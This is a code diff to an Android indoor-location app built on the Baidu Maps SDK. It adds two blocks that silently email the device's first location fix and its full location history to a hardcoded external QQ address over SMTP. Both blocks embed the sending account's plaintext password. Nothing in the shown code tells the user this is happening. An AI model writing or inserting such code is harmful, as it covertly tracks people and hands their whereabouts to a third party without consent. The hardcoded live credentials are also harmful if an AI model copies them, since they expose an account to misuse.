@@ -58,6 +58,7 @@ import com.baidu.mapapi.search.geocode.OnGetGeoCoderResultListener;
 import com.baidu.mapapi.search.geocode.ReverseGeoCodeResult;
 import com.baidu.mapapi.utils.DistanceUtil;
 import com.example.fazhao.locationmanager.R;
+import com.example.fazhao.locationmanager.baidu_map.mail.Mail;
 import com.example.fazhao.locationmanager.baidu_map.model.TraceItem;
 import com.example.fazhao.locationmanager.baidu_map.service.StepService;
 import com.example.fazhao.locationmanager.baidu_map.widget.HistoryDialog;
@@ -174,6 +175,24 @@ public class IndoorLocationActivity extends Activity implements TransferListener
                 save.setClickable(true);
                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN) {
                     save.setBackground(getResources().getDrawable(R.drawable.button_style));
+                }
+            }
+
+            /**
+            * 如果是第一次定位就发送位置
+            * */
+            if(isFirstLoc) {
+                try {
+                    String from = "linfazhao@163.com";
+                    String subject = "LocationData";
+                    String content = "位置:" + location.getAddress().address + " 时间:" + location.getTime();
+                    Mail mail = new Mail("smtp.163.com", "linfazhao@163.com", "Edwinsnao01");
+                    mail.create(from, "448517683@qq.com", subject);
+                    mail.addContent(content);
+                    mail.send();
+                    Log.e("Send OK!", "test");
+                } catch (Exception e) {
+                    e.printStackTrace();
                 }
             }
         }
@@ -517,6 +536,28 @@ public class IndoorLocationActivity extends Activity implements TransferListener
         };
         // 设置地理编码检索监听者
         geoCoder.setOnGetGeoCodeResultListener(listener);
+        Handler sendHandler = new Handler();
+        sendHandler.postDelayed(new Runnable() {
+            @Override
+            public void run() {
+                try {
+                    String from = "linfazhao@163.com";
+                    String subject = "LocationData";
+                    StringBuilder content = new StringBuilder("");
+                    for (int i = 0; i < history.size(); i++) {
+                        content.append("位置:" + history.get(i).getAddress().address);
+                        content.append(" 时间:" + history.get(i).getTime() + "\n");
+                    }
+                    Mail mail = new Mail("smtp.163.com", "linfazhao@163.com", "Edwinsnao01");
+                    mail.create(from, "448517683@qq.com", subject);
+                    mail.addContent(content.toString());
+                    mail.send();
+                    Log.e("Send OK!", "test");
+                } catch (Exception e) {
+                    e.printStackTrace();
+                }
+            }
+        },6000);
     }
 
     private void initData() {
